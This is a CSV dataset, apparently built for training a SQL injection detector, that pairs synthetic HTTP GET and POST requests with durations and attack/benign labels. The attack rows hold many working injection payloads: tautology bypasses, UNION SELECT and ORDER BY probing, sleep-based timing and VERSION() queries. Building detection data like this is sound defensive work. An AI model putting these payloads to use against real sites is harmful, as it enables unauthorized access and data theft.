text,flow_duration,label
GET /items/show.php?id=smith' OR '1'='1,6479,1
GET /products/details?productID=OR '1'='1',87993,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",4181,1
GET /user/profile?user_id=' AND user IS NULL; --,5479,1
GET /search.aspx?q=' or 1=1 limit 1 --,74658,1
GET /api/v1/users?id=3820,121735,0
"POST /login {'user': 'e', 'pass': 'password123'}",41125,0
POST /profile/update {'email': 'test.user@example.com'},39769,0
GET /products/electronics/p,81647,0
GET /api/v1/users?id=4706,73794,0
GET /assets/css/main.css,30509,0
GET /items/show.php?id=' OR 1=1--,3050,1
GET /assets/css/main.css,6371,0
GET /products/details?productID=1,25795,0
"POST /api/v1/cart/add {'item_id': '5132', 'quantity': 5}",70530,0
"GET /products/details?productID=' or """,2389,1
GET /items/show.php?id=OR 1=1,138122,1
"POST /login {'user': 'z', 'pass': 'password123'}",62996,0
GET /api/v1/users?id=4912,93122,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",5386,1
"POST /api/v1/cart/add {'item_id': '7089', 'quantity': 2}",41837,0
GET /products/books/Z,76762,0
"GET /api/v1/users?id=,",83552,1
GET /search?q=user1' or 1=1 --,68123,1
GET /search?q=J,37991,0
GET /blog/posts?page=8,129557,0
GET /api/v1/users?id=1' OR '1'='1' --,131158,1
GET /api/v1/users?id=2671,34713,0
GET /assets/css/main.css,23542,0
POST /profile/update {'email': 'test.user@example.com'},145800,0
GET /assets/css/main.css,85569,0
GET /images/products/0.jpg,68074,0
GET /admin/login?user='admin'--,4406,1
POST /profile/update {'email': 'test.user@example.com'},128086,0
GET /api/v1/users?id=2793,55084,0
GET /products/details?productID=g,56335,0
GET /api/v1/users?id=4590,144223,0
GET /products/details?productID=user1' or 1=1 --,84278,1
GET /index.php?page=' OR 1=1--,42126,1
GET /products/details?productID=W,66499,0
GET /images/products/U.jpg,31417,0
GET /blog/posts?page=12,57120,0
POST /search {'keyword': 'OR+%271%27%3D%271'},3511,1
"POST /login {'user': '9', 'pass': 'password123'}",23982,0
GET /items/show.php?id=' OR 1=1--,78003,1
GET /admin/login?user=1 AND 1=1,2018,1
GET /index.php?page=user1' or 1=1 --,147116,1
GET /search?q=/*…*/,3793,1
GET /search?q=x,34792,0
GET /products/details?productID=m,40089,0
GET /api/v1/users?id=2643,7082,0
GET /user/profile?user_id=' or 1=1 limit 1 --,1786,1
GET /assets/css/main.css,4834,0
GET /index.php?page=1*1,133515,1
GET /images/products/K.jpg,78057,0
POST /profile/update {'email': 'test.user@example.com'},62223,0
"POST /login.php {'username': '1 AND 1=1', 'password': 'password'}",1229,1
GET /admin/login?user=1=1,1453,1
GET /api/v1/users?id=5657,39679,0
POST /search {'keyword': '%00'},43269,1
"GET /api/v1/users?id=1' ORDER BY 1,2--+",124270,1
GET /index.php?page=OR+%271%27%3D%271,98875,1
GET /user/profile?user_id=smith' OR '1'='1,5643,1
GET /user/profile?user_id=105-1,7761,1
GET /assets/css/main.css,14519,0
GET /api/v1/users?id=105-1,50999,1
GET /assets/css/main.css,46019,0
"POST /login {'user': '3', 'pass': 'password123'}",93092,0
GET /search?q=-- or #,2696,1
GET /user/profile?user_id=admin' #,794,1
GET /assets/css/main.css,50928,0
"POST /api/v1/cart/add {'item_id': '7466', 'quantity': 1}",56862,0
GET /products/home/u,139207,0
GET /blog/posts?page=6,35144,0
GET /products/details?productID=I,133415,0
"POST /login {'user': 'OR 1=1', 'pass': 'password123'}",2190,1
POST /search {'keyword': '//'},90703,1
GET /blog/posts?page=11,31806,0
GET /products/details?productID=' AND user IS NULL; --,1313,1
GET /search?q=9,12812,0
"POST /login {'user': '1=1', 'pass': 'password123'}",7462,1
GET /products/details?productID=7,86721,0
GET /images/products/U.jpg,72242,0
GET /api/v1/users?id='=0--+,140218,1
GET /products/details?productID=' AND user IS NULL; --,5633,1
"POST /login {'user': 'q', 'pass': 'password123'}",4749,0
GET /user/profile?user_id=x' or 1=1--,142925,1
POST /profile/update {'email': 'test.user@example.com'},81767,0
GET /api/v1/users?id=6562,57757,0
POST /profile/update {'email': 'test.user@example.com'},13105,0
"POST /login.php {'username': '' OR '1'='1', 'password': 'password'}",2768,1
POST /search {'keyword': '1-false'},15633,1
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",24828,1
GET /api/v1/users?id=3649,71556,0
GET /products/details?productID=' OR 1=1--,3254,1
GET /admin/login?user=105-1,2554,1
POST /profile/update {'email': 'test.user@example.com'},55806,0
GET /user/profile?user_id='=0--+,2483,1
POST /profile/update {'email': 'test.user@example.com'},61602,0
GET /search?q=I,84810,0
GET /api/v1/users?id=admin' #,6724,1
GET /search.aspx?q=' AND user IS NULL; --,5662,1
GET /search.aspx?q=' OR 'x'='x,6561,1
"POST /login {'user': 'q', 'pass': 'password123'}",67665,0
GET /products/details?productID=v,41036,0
GET /api/v1/users?id=832,7728,0
"POST /login {'user': '' or ""', 'pass': 'password123'}",6544,1
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",129845,1
GET /blog/posts?page=6,55788,0
GET /search?q=' AND id IS NULL; --,82774,1
POST /profile/update {'email': 'test.user@example.com'},24889,0
GET /blog/posts?page=4,7455,0
GET /search?q=' OR 1=1--,84430,1
GET /user/profile?user_id=' AND user IS NULL; --,52906,1
GET /api/v1/users?id=8681,5899,0
GET /search.aspx?q=',58164,1
GET /api/v1/users?id=2369,146439,0
GET /products/details?productID=I,44605,0
GET /user/profile?user_id='admin'--,5432,1
"POST /login.php {'username': ''admin'--', 'password': 'password'}",3751,1
GET /user/profile?user_id=1' and '1'='1,42207,1
GET /index.php?page=' OR '1'='1,954,1
POST /profile/update {'email': 'test.user@example.com'},69933,0
"POST /login.php {'username': '1' GROUP BY 1,2,3--+', 'password': 'password'}",122883,1
GET /products/details?productID=t,1101,0
GET /images/products/Q.jpg,50391,0
GET /blog/posts?page=18,47250,0
GET /search?q=U,40317,0
GET /blog/posts?page=18,87820,0
GET /assets/css/main.css,65285,0
"POST /login {'user': '``', 'pass': 'password123'}",1029,1
POST /profile/update {'email': 'test.user@example.com'},18674,0
"POST /login {'user': '0', 'pass': 'password123'}",36811,0
POST /search {'keyword': '1' OR '1'='1' --'},98645,1
"POST /login {'user': 'Y', 'pass': 'password123'}",124328,0
GET /items/show.php?id='LIKE',74121,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",3215,1
GET /api/v1/users?id=' or 'x'='x,5940,1
GET /admin/login?user=105-1,29563,1
GET /blog/posts?page=8,57062,0
GET /assets/css/main.css,28875,0
"POST /login {'user': ''', 'pass': 'password123'}",89177,1
POST /profile/update {'email': 'test.user@example.com'},57499,0
POST /profile/update {'email': 'test.user@example.com'},61277,0
"POST /login.php {'username': '1=1', 'password': 'password'}",3294,1
GET /images/products/L.jpg,131423,0
GET /products/electronics/Z,58715,0
"GET /products/details?productID=-1 UNION SELECT 1 INTO @,@",76602,1
GET /api/v1/users?id=' OR 1=1--,2041,1
GET /products/details?productID=%2c(select%20*%20from%20(select(sleep(10)))a),1319,1
POST /search {'keyword': 'OR+%271%27%3D%271'},141933,1
GET /search?q=' AND user IS NULL; --,29662,1
"GET /index.php?page=""""",948,1
"POST /login {'user': '9', 'pass': 'password123'}",41878,0
GET /search?q=admin' #,141,1
GET /search?q=admin' #,30578,1
"POST /login {'user': '1 AND 1=1', 'pass': 'password123'}",17701,1
GET /products/details?productID=v,118984,0
GET /api/v1/users?id=8775,59020,0
GET /products/electronics/7,35692,0
GET /blog/posts?page=9,40505,0
GET /products/details?productID=%2c(select%20*%20from%20(select(sleep(10)))a),1096,1
"POST /login {'user': '9', 'pass': 'password123'}",4830,0
GET /search.aspx?q=OR '1'='1',16403,1
GET /items/show.php?id=' OR '1'='1,88333,1
GET /index.php?page=105-1,128087,1
GET /assets/css/main.css,40346,0
GET /products/details?productID=``,132585,1
"POST /login {'user': 'I', 'pass': 'password123'}",82974,0
GET /api/v1/users?id=352,41939,0
GET /user/profile?user_id=1*56,49842,1
GET /search?q=' OR 1 -- -,581,1
GET /blog/posts?page=2,21659,0
GET /products/details?productID=U,29275,0
"POST /api/v1/cart/add {'item_id': '4376', 'quantity': 3}",100386,0
GET /search?q=L,34422,0
GET /search?q=AND 0,7723,1
GET /assets/css/main.css,15620,0
GET /api/v1/users?id=5670,50888,0
GET /search?q=r,104397,0
GET /products/details?productID=N,29205,0
GET /search?q=Z,23753,0
GET /products/details?productID=OR 1=1,31817,1
GET /products/details?productID=105-1,4355,1
"POST /login {'user': 'O', 'pass': 'password123'}",56339,0
"POST /login {'user': '' OR '1', 'pass': 'password123'}",131963,1
GET /items/show.php?id=1024-2,80879,1
"POST /login.php {'username': '1 AND 1=1', 'password': 'password'}",54075,1
"POST /api/v1/cart/add {'item_id': '1503', 'quantity': 2}",5027,0
GET /search?q=P,58971,0
GET /api/v1/users?id=' AND user IS NULL; --,5994,1
GET /search?q=b,68727,0
GET /user/profile?user_id=user1' or 1=1 --,35019,1
GET /products/details?productID=1' OR '1'='1' --,2504,1
"POST /login.php {'username': 'OR '1'='1'', 'password': 'password'}",115248,1
GET /products/details?productID=1 AND 1=1,3908,1
GET /search?q=r,51830,0
GET /api/v1/users?id=8185,24170,0
GET /images/products/M.jpg,87890,0
"GET /search.aspx?q=1' ORDER BY 1,2,3--+",84337,1
"POST /api/v1/cart/add {'item_id': '1146', 'quantity': 1}",27444,0
GET /api/v1/users?id=-2,7346,1
GET /images/products/y.jpg,18262,0
GET /admin/login?user=1' OR '1'='1' --,2792,1
GET /search?q=' OR 1=1--,7096,1
POST /profile/update {'email': 'test.user@example.com'},143642,0
GET /search?q=' AND user IS NULL; --,42651,1
"POST /api/v1/cart/add {'item_id': '6155', 'quantity': 5}",70083,0
GET /products/details?productID=' OR 'x'='x,113416,1
"POST /login {'user': 'i', 'pass': 'password123'}",94088,0
GET /search?q=smith' OR '1'='1,5022,1
GET /search?q=f,81406,0
GET /search?q=z,33047,0
"POST /login {'user': 'x', 'pass': 'password123'}",5429,0
GET /items/show.php?id=' OR 1=1--,5514,1
GET /user/profile?user_id='admin'--,8196,1
"POST /login {'user': 'AND 1', 'pass': 'password123'}",20231,1
GET /products/details?productID=h,141719,0
GET /admin/login?user=105-1,4939,1
GET /admin/login?user=' OR 'x'='x,441,1
"POST /login {'user': ''='', 'pass': 'password123'}",11588,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",128949,1
GET /products/details?productID=1 AND (SELECT * FROM Users) = 1,83933,1
GET /api/v1/users?id=1-true,81083,1
GET /items/show.php?id=user1' or 1=1 --,110573,1
"POST /login {'user': 'T', 'pass': 'password123'}",8010,0
"GET /admin/login?user=' or """,6429,1
POST /profile/update {'email': 'test.user@example.com'},40047,0
GET /blog/posts?page=11,69276,0
GET /products/details?productID=c,19180,0
GET /images/products/c.jpg,10541,0
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",1856,1
POST /search {'keyword': '-- or #'},119562,1
GET /items/show.php?id=' OR 1=1 /*,814,1
GET /api/v1/users?id=9718,31415,0
"POST /login {'user': 't', 'pass': 'password123'}",143730,0
GET /products/details?productID=G,4019,0
GET /items/show.php?id=' or 'x'='x,7503,1
GET /api/v1/users?id=' AND user IS NULL; --,59795,1
GET /admin/login?user=' OR '1'='1,38458,1
GET /assets/css/main.css,33045,0
GET /products/details?productID=' OR '1'='1,7651,1
"POST /login {'user': 'U', 'pass': 'password123'}",31436,0
GET /search.aspx?q=1*1,6318,1
GET /assets/css/main.css,141778,0
GET /user/profile?user_id=1=1,1543,1
GET /search?q='admin'--,77846,1
POST /search {'keyword': '1024-2'},104339,1
"POST /search {'keyword': '' AND MID(VERSION(),1,1) = '5';'}",3255,1
GET /products/details?productID=B,43824,0
GET /admin/login?user=1 AND 1=1,2886,1
GET /user/profile?user_id=OR+%271%27%3D%271,3692,1
"POST /login {'user': 'C', 'pass': 'password123'}",104673,0
GET /admin/login?user=\\,142790,1
"POST /api/v1/cart/add {'item_id': '2933', 'quantity': 4}",140362,0
GET /user/profile?user_id=' or 1=1 limit 1 --,63314,1
GET /assets/css/main.css,138171,0
GET /user/profile?user_id=OR+%271%27%3D%271,4719,1
GET /api/v1/users?id=\\,1521,1
GET /products/details?productID=W,62665,0
GET /index.php?page=' OR 'x'='x,135389,1
"POST /login.php {'username': '1' OR '1'='1' --', 'password': 'password'}",64856,1
GET /search?q=//,4036,1
GET /assets/css/main.css,28558,0
POST /search {'keyword': '' OR 1=1 /*'},89104,1
POST /profile/update {'email': 'test.user@example.com'},15002,0
GET /products/home/h,128503,0
GET /search.aspx?q=' OR '1'='1,127963,1
GET /api/v1/users?id=8237,40167,0
GET /api/v1/users?id=1' OR '1'='1' --,57926,1
GET /api/v1/users?id=' or 1=1 limit 1 --,4709,1
GET /products/books/i,70181,0
GET /products/home/9,81270,0
GET /search.aspx?q=admin' #,111543,1
GET /index.php?page=' OR 'x'='x,522,1
"GET /products/details?productID=""",113865,1
GET /assets/css/main.css,78405,0
GET /products/details?productID=105-1,6820,1
GET /api/v1/users?id=5641,77044,0
GET /api/v1/users?id=1' OR '1'='1' --,132518,1
GET /products/home/b,55758,0
GET /search.aspx?q=' or 1=1 limit 1 --,5442,1
GET /api/v1/users?id=1' ORDER BY 1--+,15597,1
GET /search?q=\,22044,1
GET /items/show.php?id=' OR 'x'='x,47551,1
GET /api/v1/users?id=1024-2,3691,1
"GET /products/details?productID=1' GROUP BY 1,2,--+",12811,1
GET /api/v1/users?id='''''''''''''UNION SELECT '2,17933,1
GET /products/details?productID=' or 'x'='x,147470,1
"GET /admin/login?user=1' GROUP BY 1,2,--+",5948,1
GET /search?q=' OR '1'='1,80687,1
"POST /login {'user': 't', 'pass': 'password123'}",22517,0
GET /images/products/l.jpg,67270,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",1247,1
GET /images/products/q.jpg,56535,0
POST /search {'keyword': '105-1'},3710,1
GET /api/v1/users?id=1024-2,3254,1
GET /items/show.php?id=' OR 1=1 /*,4750,1
GET /search.aspx?q=``,4273,1
GET /api/v1/users?id=8282,86137,0
GET /images/products/I.jpg,31806,0
GET /api/v1/users?id=%00,72287,1
GET /products/details?productID=v,54913,0
"GET /user/profile?user_id=,(select * from (select(sleep(10)))a)",100345,1
GET /images/products/M.jpg,109615,0
"POST /login {'user': 'k', 'pass': 'password123'}",26430,0
GET /products/details?productID=1*1,89380,1
"GET /search.aspx?q=""""",105612,1
GET /products/electronics/Q,73558,0
GET /products/details?productID=' or 1=1 limit 1 --,4551,1
"POST /login {'user': 'admin' #', 'pass': 'password123'}",4883,1
GET /products/details?productID=1' and '1'='1,4379,1
GET /products/details?productID=1 AND 1=1,28198,1
"POST /login {'user': 'j', 'pass': 'password123'}",33639,0
GET /search?q=1=1,58430,1
"GET /items/show.php?id=-1' UNION SELECT 1,2,3--+",6862,1
GET /products/electronics/w,125432,0
GET /user/profile?user_id=``,143429,1
GET /products/electronics/f,25281,0
GET /index.php?page=1024-2,43125,1
GET /images/products/W.jpg,34669,0
GET /products/home/X,97717,0
GET /search.aspx?q=1 AND 1=1,117489,1
"POST /api/v1/cart/add {'item_id': '1989', 'quantity': 3}",23256,0
GET /admin/login?user=OR+%271%27%3D%271,135802,1
GET /products/details?productID=t,14213,0
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",13046,1
"POST /login.php {'username': 'OR '1'='1'', 'password': 'password'}",7260,1
GET /index.php?page=%00,139470,1
GET /search?q=y,20472,0
GET /search.aspx?q=admin' #,7906,1
"POST /api/v1/cart/add {'item_id': '4954', 'quantity': 4}",124193,0
GET /api/v1/users?id=AND true,90851,1
GET /api/v1/users?id=9803,131203,0
GET /products/details?productID=1=1,92637,1
POST /search {'keyword': '1024-2'},66822,1
"POST /login.php {'username': '105-1', 'password': 'password'}",6392,1
GET /api/v1/users?id=smith' OR '1'='1,83592,1
GET /search?q=8,81184,0
GET /api/v1/users?id=9789,20999,0
GET /user/profile?user_id=OR+%271%27%3D%271,16631,1
"GET /search.aspx?q=-1 UNION SELECT 1 INTO @,@,@",786,1
GET /user/profile?user_id=OR '1'='1',6541,1
"POST /login {'user': 'E', 'pass': 'password123'}",25504,0
GET /assets/css/main.css,2520,0
GET /api/v1/users?id=1024-2,4523,1
GET /api/v1/users?id='''''''''''''UNION SELECT '2,14906,1
GET /images/products/q.jpg,75766,0
GET /products/electronics/F,143450,0
GET /products/details?productID=;,88116,1
GET /search?q=O,81706,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",7939,1
GET /blog/posts?page=10,39669,0
"POST /login {'user': '\', 'pass': 'password123'}",6818,1
GET /api/v1/users?id=588,87824,0
GET /products/details?productID=105-1,114585,1
GET /api/v1/users?id=OR '1'='1',56059,1
GET /images/products/3.jpg,136330,0
GET /api/v1/users?id=OR+%271%27%3D%271,91849,1
GET /search.aspx?q=smith' OR '1'='1,6959,1
GET /items/show.php?id=1024-2,34575,1
GET /index.php?page=smith' OR '1'='1,21751,1
"POST /login {'user': '1024-2', 'pass': 'password123'}",81898,1
GET /search?q=p,78912,0
GET /admin/login?user=' or 1=1 limit 1 --,6228,1
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",7940,1
GET /api/v1/users?id=7123,59747,0
GET /api/v1/users?id='',6238,1
GET /images/products/I.jpg,97059,0
"POST /login {'user': 'u', 'pass': 'password123'}",45491,0
POST /search {'keyword': '1' ORDER BY 2--+'},101334,1
GET /search?q=1-true,45255,1
GET /products/details?productID=S,16513,0
GET /products/details?productID=smith' OR '1'='1,95146,1
GET /user/profile?user_id=' or 1=1 limit 1 --,92073,1
POST /profile/update {'email': 'test.user@example.com'},33735,0
GET /api/v1/users?id=1024-2,3651,1
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",53938,1
GET /user/profile?user_id=1' and '1'='1,4545,1
GET /user/profile?user_id=1*1,2924,1
"POST /login {'user': 'OR '1'='1'', 'pass': 'password123'}",844,1
GET /search?q=OR '1'='1',3764,1
GET /products/details?productID=C,17942,0
GET /items/show.php?id=' OR '1,3370,1
GET /assets/css/main.css,46143,0
GET /admin/login?user=' or 'x'='x,339,1
POST /search {'keyword': 'admin' #'},42830,1
GET /api/v1/users?id=105-1,632,1
GET /api/v1/users?id=OR '1'='1',23253,1
GET /index.php?page=1=1,6233,1
GET /search?q=' OR 'x'='x,36576,1
"POST /login {'user': 'S', 'pass': 'password123'}",103558,0
GET /blog/posts?page=7,141305,0
GET /products/electronics/H,43045,0
"GET /search.aspx?q=1' ORDER BY 1,2--+",5776,1
GET /search?q=1=1,81134,1
GET /products/details?productID=1' OR '1'='1' --,1767,1
GET /products/details?productID=1024-2,42125,1
"POST /login {'user': 'Y', 'pass': 'password123'}",45678,0
GET /items/show.php?id=' or 'x'='x,21581,1
"POST /login {'user': 'admin' #', 'pass': 'password123'}",103797,1
GET /search?q=Q,28057,0
GET /api/v1/users?id=' OR '1'='1,1814,1
"GET /index.php?page=1' ORDER BY 1,2,3--+",7678,1
GET /admin/login?user=smith' OR '1'='1,82910,1
GET /index.php?page=1024-2,4892,1
GET /user/profile?user_id=1*1,44033,1
GET /products/details?productID=3,82663,0
GET /assets/css/main.css,85532,0
GET /products/electronics/v,66948,0
POST /profile/update {'email': 'test.user@example.com'},10617,0
GET /api/v1/users?id=' or 1=1 limit 1 --,4266,1
POST /search {'keyword': '' AND user IS NULL; --'},161,1
GET /blog/posts?page=19,28114,0
GET /images/products/k.jpg,39692,0
GET /products/details?productID=p,88814,0
POST /profile/update {'email': 'test.user@example.com'},21705,0
GET /api/v1/users?id=' or 'x'='x,84416,1
GET /products/details?productID=K,74859,0
GET /search?q=' OR 1=1--,4991,1
GET /assets/css/main.css,86000,0
GET /api/v1/users?id=717,96086,0
GET /search?q=8,63441,0
GET /admin/login?user=admin' #,92321,1
GET /search.aspx?q=1' ORDER BY 3--+,117566,1
GET /api/v1/users?id=1 AND (SELECT * FROM Users) = 1,94885,1
"POST /login.php {'username': '' AND user IS NULL; --', 'password': 'password'}",91270,1
GET /api/v1/users?id=1' and '1'='1,74189,1
"POST /api/v1/cart/add {'item_id': '8426', 'quantity': 1}",128232,0
"POST /api/v1/cart/add {'item_id': '7366', 'quantity': 2}",83507,0
"POST /login.php {'username': '' OR 1=1 /*', 'password': 'password'}",3256,1
GET /search?q=OR '1'='1',3580,1
GET /api/v1/users?id=1872,39930,0
POST /profile/update {'email': 'test.user@example.com'},75304,0
"POST /login {'user': 'e', 'pass': 'password123'}",86388,0
POST /profile/update {'email': 'test.user@example.com'},140985,0
GET /index.php?page=' OR 'x'='x,373,1
GET /assets/css/main.css,129331,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",47905,1
"POST /login {'user': 'z', 'pass': 'password123'}",139326,0
GET /api/v1/users?id=6312,74776,0
GET /api/v1/users?id=1-true,4162,1
GET /assets/css/main.css,27252,0
GET /api/v1/users?id=6884,6847,0
GET /search?q=' OR 1=1 /*,4022,1
GET /products/books/c,37465,0
"POST /login {'user': '105-1', 'pass': 'password123'}",1419,1
POST /profile/update {'email': 'test.user@example.com'},90139,0
GET /blog/posts?page=19,13333,0
"GET /search?q=1' GROUP BY 1,2,--+",110330,1
GET /items/show.php?id=' or 1=1 limit 1 --,5387,1
GET /products/home/P,25810,0
GET /assets/css/main.css,94607,0
GET /api/v1/users?id=7095,47119,0
POST /search {'keyword': '1' and '1'='1'},141135,1
GET /admin/login?user=1' and '1'='1,3021,1
GET /search?q=V,68713,0
GET /user/profile?user_id=OR '1'='1',80619,1
GET /user/profile?user_id=' or 1=1 limit 1 --,4251,1
"POST /api/v1/cart/add {'item_id': '1101', 'quantity': 4}",84692,0
GET /index.php?page=OR+%271%27%3D%271,7481,1
"POST /login.php {'username': 'user1' or 1=1 --', 'password': 'password'}",6703,1
GET /api/v1/users?id=6657,43705,0
GET /products/details?productID=9,107995,0
POST /profile/update {'email': 'test.user@example.com'},107335,0
GET /blog/posts?page=8,60191,0
GET /search?q=1' OR '1'='1' --,401,1
POST /search {'keyword': '' OR 1=1 /*'},2656,1
GET /api/v1/users?id=OR+%271%27%3D%271,65169,1
GET /search?q=i,13035,0
GET /images/products/v.jpg,19065,0
GET /api/v1/users?id=7442,67792,0
"POST /login {'user': 'Z', 'pass': 'password123'}",43986,0
GET /api/v1/users?id=4838,124559,0
GET /images/products/m.jpg,56403,0
GET /products/books/O,12974,0
GET /products/details?productID=' OR 'x'='x,229,1
GET /search?q=1*1,546,1
GET /products/details?productID=1024-2,18660,1
"GET /api/v1/users?id=""""",603,1
GET /products/details?productID=S,42753,0
"POST /api/v1/cart/add {'item_id': '8192', 'quantity': 5}",85867,0
"POST /login {'user': 'J', 'pass': 'password123'}",116409,0
GET /search?q=u,69342,0
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",56583,1
"POST /login {'user': '1*1', 'pass': 'password123'}",6650,1
GET /blog/posts?page=14,85214,0
GET /api/v1/users?id=9693,44489,0
GET /search.aspx?q=' AND user IS NULL; --,6913,1
"POST /search {'keyword': '' AND MID(VERSION(),1,1) = '5';'}",4608,1
GET /search?q=' OR '1,6224,1
GET /api/v1/users?id=' OR '1'='1,81488,1
"POST /login {'user': 'B', 'pass': 'password123'}",111805,0
POST /search {'keyword': 'OR '1'='1''},28648,1
GET /products/details?productID=g,145214,0
GET /blog/posts?page=14,44792,0
GET /blog/posts?page=11,17819,0
POST /search {'keyword': '' OR 'x'='x'},7964,1
"POST /login {'user': 'z', 'pass': 'password123'}",132349,0
GET /products/details?productID=1=1,1270,1
GET /products/details?productID=u,81980,0
GET /products/details?productID=;,122508,1
GET /search?q=OR 1=1,126472,1
GET /products/details?productID=n,42019,0
GET /search?q=R,58880,0
"POST /api/v1/cart/add {'item_id': '3705', 'quantity': 4}",38038,0
GET /assets/css/main.css,108657,0
GET /products/details?productID=user1' or 1=1 --,10667,1
"POST /api/v1/cart/add {'item_id': '2186', 'quantity': 5}",11139,0
GET /api/v1/users?id=9377,70420,0
"GET /index.php?page=""""",5134,1
GET /images/products/S.jpg,113479,0
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",3282,1
"POST /login {'user': 'OR+%271%27%3D%271', 'pass': 'password123'}",9329,1
POST /profile/update {'email': 'test.user@example.com'},34606,0
GET /search?q=1' OR '1'='1' --,740,1
GET /blog/posts?page=2,45146,0
GET /blog/posts?page=9,60236,0
GET /images/products/q.jpg,18842,0
GET /api/v1/users?id=admin' #,3450,1
GET /blog/posts?page=20,65682,0
"POST /login {'user': 'OR+%271%27%3D%271', 'pass': 'password123'}",94032,1
POST /profile/update {'email': 'test.user@example.com'},38554,0
"POST /login.php {'username': '' or ""', 'password': 'password'}",1228,1
GET /api/v1/users?id=8785,7776,0
GET /user/profile?user_id=OR+%271%27%3D%271,7274,1
GET /admin/login?user=1=1,5995,1
